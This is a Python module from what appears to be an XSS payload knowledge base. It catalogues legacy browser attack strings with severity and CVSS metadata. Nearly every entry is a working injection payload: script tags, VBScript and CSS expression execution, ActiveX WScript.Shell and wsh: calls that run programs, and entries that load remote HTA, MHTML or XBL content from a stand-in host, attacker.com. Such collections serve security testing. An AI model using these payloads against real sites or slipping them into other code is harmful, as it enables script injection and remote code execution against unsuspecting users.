#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2026-01-10 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Legacy & Exotic Payloads (MHTML, HTA, VBScript, XBL)
Ancient techniques that still work in enterprise legacy systems (IE mode, Outlook)
"""

from ..models import PayloadEntry

LEGACY_EXOTIC_PAYLOADS = {
    # MHTML (MIME Encapsulation of Aggregate HTML Documents)
    "mhtml_iframe_xss": PayloadEntry(
        payload="mhtml:http://attacker.com/n.html!xss.html",
        contexts=["url", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="MHTML protocol iframe injection (IE)",
        tags=["mhtml", "legacy", "ie"],
        reliability="low",
    ),
    # HTA (HTML Application)
    "hta_script_execution": PayloadEntry(
        payload="<script>new ActiveXObject('WScript.Shell').Run('calc.exe');</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.8,
        description="HTA ActiveX RCE (Requires unsafe ActiveX)",
        tags=["hta", "activex", "rce"],
        reliability="medium",
        attack_surface="desktop-bridge",
    ),
    "hta_iframe_app": PayloadEntry(
        payload="<iframe src='http://attacker.com/evil.hta' application='yes'></iframe>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="HTA application iframe",
        tags=["hta", "iframe", "legacy"],
        reliability="low",
    ),
    # VBScript
    "vbscript_exec": PayloadEntry(
        payload="<script language='vbscript'>MsgBox(\"XSS\")</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="VBScript execution",
        tags=["vbscript", "legacy", "ie"],
        reliability="low",
    ),
    "vbscript_event": PayloadEntry(
        payload="<img src=x onerror='vbscript:MsgBox(\"XSS\")'>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="VBScript in event handler",
        tags=["vbscript", "event"],
        reliability="low",
    ),
    # XBL (XML Binding Language) - Firefox Legacy
    "xbl_binding": PayloadEntry(
        payload="<div style='-moz-binding:url(http://attacker.com/xss.xml#xss)'></div>",
        contexts=["css", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="XBL binding via CSS (Old Firefox)",
        tags=["xbl", "css", "firefox-legacy"],
        reliability="low",
    ),
    # CSS Expression (IE)
    "css_expression": PayloadEntry(
        payload="width: expression(alert(1));",
        contexts=["css", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="CSS expression execution (IE6/7)",
        tags=["css", "expression", "ie-legacy"],
        reliability="low",
    ),
    "css_behavior": PayloadEntry(
        payload="behavior: url(xss.htc);",
        contexts=["css", "html_content"],
        severity="high",
        cvss_score=7.0,
        description="CSS behavior HTC file execution",
        tags=["css", "behavior", "htc"],
        reliability="low",
    ),
    # Windows Script Host
    "wsh_protocol": PayloadEntry(
        payload="wsh:Run('calc')",
        contexts=["url", "html_content"],
        severity="critical",
        cvss_score=9.0,
        description="Windows Script Host protocol",
        tags=["wsh", "protocol", "rce"],
        reliability="low",
    ),
}

LEGACY_EXOTIC_TOTAL = len(LEGACY_EXOTIC_PAYLOADS)
